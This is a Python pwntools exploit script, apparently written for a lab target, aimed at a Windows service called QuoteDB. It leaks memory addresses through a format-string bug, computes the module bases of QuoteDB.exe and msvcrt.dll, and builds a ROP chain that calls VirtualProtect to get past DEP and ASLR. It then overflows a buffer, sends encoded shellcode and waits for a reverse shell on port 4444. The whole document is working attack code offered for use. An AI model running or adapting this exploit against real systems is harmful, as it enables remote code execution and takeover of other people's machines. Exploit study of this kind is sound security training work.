#ROP #BOF

## Mitigations #ASLR #DEP

```python
from pwn import *
from pprint import pprint
from typing import List, Union


class _printx():

    def __call__(self, *values, indent=0, icon="", newline=False):
        print(
            " " * (indent*4-1),
            icon,
            *values,
            ("\n" if newline else "")
        )

    def alert(self, *values, indent=0, newline=False):
        self.__call__(*values, indent=indent, icon="[!]", newline=newline)
        
    def info(self, *values, indent=0, newline=False):
        self.__call__(*values, indent=indent, icon="[+]", newline=newline)
        
    def member(self, *values, indent=0, newline=False):
        self.__call__(*values, indent=indent, icon="-", newline=newline)

    def debug(self, *values, indent=0, newline=False):
        self.__call__(*values, indent=indent, icon="?", newline=newline)

printx = _printx()

context.update(arch='i386', os="windows")
context.log_level = logging.CRITICAL

SERVER = "localhost"
PORT = 3700
BUFFER_SIZE = 2048

ALIGN_STACK = b'\x83\xE4\xF0'

PAYLOAD = (
    b""
    b"\xdb\xc9\xb8\xde\x14\x60\x07\xd9\x74\x24\xf4"
    b"\x5b\x31\xc9\xb1\x52\x83\xc3\x04\x31\x43\x13"
    b"\x03\x9d\x07\x82\xf2\xdd\xc0\xc0\xfd\x1d\x11"
    b"\xa5\x74\xf8\x20\xe5\xe3\x89\x13\xd5\x60\xdf"
    b"\x9f\x9e\x25\xcb\x14\xd2\xe1\xfc\x9d\x59\xd4"
    b"\x33\x1d\xf1\x24\x52\x9d\x08\x79\xb4\x9c\xc2"
    b"\x8c\xb5\xd9\x3f\x7c\xe7\xb2\x34\xd3\x17\xb6"
    b"\x01\xe8\x9c\x84\x84\x68\x41\x5c\xa6\x59\xd4"
    b"\xd6\xf1\x79\xd7\x3b\x8a\x33\xcf\x58\xb7\x8a"
    b"\x64\xaa\x43\x0d\xac\xe2\xac\xa2\x91\xca\x5e"
    b"\xba\xd6\xed\x80\xc9\x2e\x0e\x3c\xca\xf5\x6c"
    b"\x9a\x5f\xed\xd7\x69\xc7\xc9\xe6\xbe\x9e\x9a"
    b"\xe5\x0b\xd4\xc4\xe9\x8a\x39\x7f\x15\x06\xbc"
    b"\xaf\x9f\x5c\x9b\x6b\xfb\x07\x82\x2a\xa1\xe6"
    b"\xbb\x2c\x0a\x56\x1e\x27\xa7\x83\x13\x6a\xa0"
    b"\x60\x1e\x94\x30\xef\x29\xe7\x02\xb0\x81\x6f"
    b"\x2f\x39\x0c\x68\x50\x10\xe8\xe6\xaf\x9b\x09"
    b"\x2f\x74\xcf\x59\x47\x5d\x70\x32\x97\x62\xa5"
    b"\x95\xc7\xcc\x16\x56\xb7\xac\xc6\x3e\xdd\x22"
    b"\x38\x5e\xde\xe8\x51\xf5\x25\x7b\x9e\xa2\x24"
    b"\x7e\x76\xb1\x26\x91\xda\x3c\xc0\xfb\xf2\x68"
    b"\x5b\x94\x6b\x31\x17\x05\x73\xef\x52\x05\xff"
    b"\x1c\xa3\xc8\x08\x68\xb7\xbd\xf8\x27\xe5\x68"
    b"\x06\x92\x81\xf7\x95\x79\x51\x71\x86\xd5\x06"
    b"\xd6\x78\x2c\xc2\xca\x23\x86\xf0\x16\xb5\xe1"
    b"\xb0\xcc\x06\xef\x39\x80\x33\xcb\x29\x5c\xbb"
    b"\x57\x1d\x30\xea\x01\xcb\xf6\x44\xe0\xa5\xa0"
    b"\x3b\xaa\x21\x34\x70\x6d\x37\x39\x5d\x1b\xd7"
    b"\x88\x08\x5a\xe8\x25\xdd\x6a\x91\x5b\x7d\x94"
    b"\x48\xd8\x9d\x77\x58\x15\x36\x2e\x09\x94\x5b"
    b"\xd1\xe4\xdb\x65\x52\x0c\xa4\x91\x4a\x65\xa1"
    b"\xde\xcc\x96\xdb\x4f\xb9\x98\x48\x6f\xe8"
)

# Exploit specific helpers
def do_connect():
    try:
        return remote(SERVER, PORT)
    except:
        printx.alert("Could not connect", indent=2)
        return None


def do_send(t, opcode, a0, a1):
    buf = opcode + a0 + a1

    printx.alert(f"Sending buffer to target ({buf.hex()[0:20]}...)", indent=2)
    t.sendline(buf)
    try:
        rbuf = t.recv()
        printx.alert(f"Received buffer from target ({rbuf.hex()[0:20]}...)", indent=2)
        return rbuf
    except:
        printx.alert("Closed with no response", indent=2)
        return


def do_leak():
    t = do_connect()
    printx.member("Creating leaker quote", indent=1)
    leaker_quote_index = u32(do_send(t, p32(902), b"%p:"*16, b""))
    printx.member("Added leaker quote at index", leaker_quote_index, "\n", indent=1)

    t = do_connect()
    printx.member("Getting back leaked memory", indent=1)
    leaker_quote = do_send(t, p32(901), p32(leaker_quote_index), b"")
    printx.member("Read leaker quote:", leaker_quote, "\n", indent=1)

    return {
        "near_exit_thread_msvcrt": int(leaker_quote.split(b":")[0],16),
        "handle_connection_leak_quotedb": int(leaker_quote.split(b":")[2],16)
    }


def do_trigger(buf):
    t = do_connect()
    printx.member("Sending trigger buffer as bad opcode", indent=1)
    t.sendline(buf)
    t.close()
    printx.member("Trigger sent, waiting for shell", "\n", indent=1)


# ROP helper library
def get_virt_base(virt_addr, offset):
    return virt_addr - offset


class Gadget(object):
    def __init__(self, gname, offset):
        self.gname = gname
        self.offset = offset


class GadgetResolver(object):  

    def __init__(self, base):
        self.base = base
        self.gadgets = {}
        
    def add_gadget(self, gadget: Gadget):
        self.gadgets[gadget.gname] = gadget.offset
        
    def add_gadgets(self, *gadgets: Gadget):
        for gadget in gadgets:
            self.add_gadget(gadget)

    def get_gadget(self, gname):
        return self.gadgets[gname] + self.base
        
    def resolve_all(self):
        return {k:self.get_gadget(k) for k, _ in self.gadgets.items()}


class ROPBuilder():
    def __init__(self, *gadget_pools: GadgetResolver):
    
        self.gadgets = {}
        for pool in gadget_pools:
            self.gadgets.update(pool.resolve_all())

    def get_chain_array(self, *chain: Union[str,int]) -> List[int]:
    
        o_chain = []
        
        for item in chain:
            if type(item) is str:
                if item not in self.gadgets:
                    raise ValueError(
	                    f"Can't find gadget, please add it first('{item}')"
                    )
                o_chain.append(self.gadgets[item])
            elif type(item) is int:
                o_chain.append(item)
            else:
                raise ValueError("Gadget value invalid, should be either str or int")
                
        self.chain_labels = []
        
        # Get labels for every item in the chain
        const_count = 0
        for label in chain:
            if type(label) is int:
                self.chain_labels.append(f"const_{const_count}")
                const_count += 1
            else:
                self.chain_labels.append(label)
        self.chain_array = o_chain
        
        return o_chain

    def get_chain_buffer(self, *chain:Union[str,int]) -> bytes:
    
        if not self.chain_array:
            if len(chain) == 0:
                raise ValueError("Must provide raw chain if not already resolved")
            self.get_chain_array(chain)
            
        return b"".join([p32(item) for item in self.chain_array])
  
    def get_chain_tuple(self):
        return zip(self.chain_labels, self.chain_array)


# Get address leak
printx.info("Leaking addresses")
leaks = do_leak()

printx.info(
    "Got leak of quotedb!_handle_connection:",
    hex(leaks["handle_connection_leak_quotedb"]),
)
printx.info(
    "Got leak of near msvcrt!exit_thread:",
    hex(leaks["near_exit_thread_msvcrt"]),
    newline=True
)

# Calculate image bases
qoutedb_base = get_virt_base(
    virt_addr=leaks["handle_connection_leak_quotedb"],
    offset=0x173b
)
msvcrt_base = get_virt_base(
    virt_addr=leaks["near_exit_thread_msvcrt"],
    offset=0x66BC0
)

printx.info("Got 'QuoteDB.exe' module base:", hex(qoutedb_base))
printx.info("Got 'msvcrt.dll' module base:", hex(msvcrt_base), newline=True)
  
# Construct a rop chain
printx.info("Registering gadgets")
quotedb_gadgets = GadgetResolver(qoutedb_base)
msvcrt_gadgets = GadgetResolver(msvcrt_base)

quotedb_gadgets.add_gadgets(
    Gadget("ret", offset=0x1289),
    Gadget("pop_ecx", offset=0x2b38),
    Gadget("VirtualProtect_addr", offset=0x4321c),
    Gadget("pop_ebp", offset=0x140b),
    Gadget("pop_edi", offset=0x2a55),
    Gadget("pop_ebp", offset=0x140b),
    Gadget("p_writeable", offset=0x1fc00) # Random RW address in image 
)

msvcrt_gadgets.add_gadgets(
    Gadget("push_esp", offset=0x97448),
    Gadget("pop_esi", offset=0x3be2d),
    Gadget("mov_eax_ptr_ecx;add_cl_cl", offset=0x43d1e),
    Gadget("xchg_eax_esi;cmpsb", offset=0x13a8a),
    Gadget("pop_eax", offset=0x3aa22),
    Gadget("neg_eax;pop_ebp", offset=0x2fa2e),
    Gadget("pushad", offset=0x56f67),
    Gadget("xchg_eax_ebx", offset=0x17926),
    Gadget("mov_edx_eax;mov_eax_edx;pop_ebp", offset=0x64ca3),
    Gadget("dec_eax", offset=0x90b8)
)

printx.info("Resolving gadgets and constructing rop chain")

rop_builder = ROPBuilder(quotedb_gadgets, msvcrt_gadgets)

rop_chain = rop_builder.get_chain_array(
    # Get pointer to VirtualProtect from IAT and dereference -> ESI
    "pop_ecx",
    "VirtualProtect_addr",
    "mov_eax_ptr_ecx;add_cl_cl", # Side effect, doubles cl (ecx no longer virtprot iat)
    "dec_eax",
    "xchg_eax_esi;cmpsb", # Side effect may set status flags
    
    # Get dwSize in ebx
    "pop_eax",
    0xfffffdff,
    "neg_eax;pop_ebp", # Side effect pop ebp junk
    0xffffffff,
    "xchg_eax_ebx",
    
    # Get flNewProtect in edx
    "pop_eax",
    0xffffffc0,
    "neg_eax;pop_ebp", # Side effect pop ebp junk
    0xffffffff,
    "mov_edx_eax;mov_eax_edx;pop_ebp", # Side effect, edx -> eax (so nothing really), 
	                                   # pop ebp junk
    0xffffffff,
    
    # Get a pointer to writeable memory in ecx
    "pop_ecx",
    "p_writeable",
    
    # Get a ret instruction in edi
    "pop_edi",
    "ret",
    
    # Get some nops in eax
    "pop_eax",
    0x90909090,
    
    # Get push_esp (essentially jmp esp) gadget in ebp
    "pop_ebp",
    "push_esp",
    
    # Push these on to the stack
    "pushad"
)

printx("[", indent=1)
for name, address in rop_builder.get_chain_tuple():
    printx(name, ":", hex(address) + ",", indent=2)

printx("]", indent=1)

# Send trigger
printx.info("Sending trigger")
pre_pad = b"a"*(BUFFER_SIZE + 16)

do_trigger(pre_pad + rop_builder.get_chain_buffer() + ALIGN_STACK + PAYLOAD)

# Get reverse shell
printx.info("Waiting for shell:", newline=True)

l = listen(4444)
_ = l.wait_for_connection()
l.interactive()
```